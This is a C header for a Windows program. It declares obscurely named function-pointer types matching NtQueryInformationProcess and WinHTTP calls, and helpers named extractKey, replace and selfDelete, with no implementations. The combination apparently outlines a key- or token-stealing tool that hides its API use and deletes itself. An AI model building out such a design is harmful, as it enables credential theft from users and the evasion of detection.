#pragma once

#include <Windows.h>
#include <shlobj_core.h>
#include <strsafe.h>
#include <winhttp.h>

typedef NTSTATUS(NTAPI* func1)(HANDLE ProcessHandle, UINT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef HINTERNET(WINAPI* func2)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(WINAPI* func3)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* func4)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL(WINAPI* func5)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(WINAPI* func6)(HINTERNET hInternet);
typedef BOOL(WINAPI* func7)(HINTERNET hRequest, LPVOID lpReserved);

LPWSTR searchStr(LPWSTR str, LPWSTR substring);
LPWSTR split(LPWSTR str, WCHAR delim, int numSplit, int* totalHits);
LPWSTR strchr42a(LPWSTR str, int ch);
LPSTR replace(LPBYTE data, size_t bytes);
LPWSTR extractKey(LPSTR fileContent);
size_t strl(LPWSTR s);
size_t strl2(LPSTR s);
void selfDelete();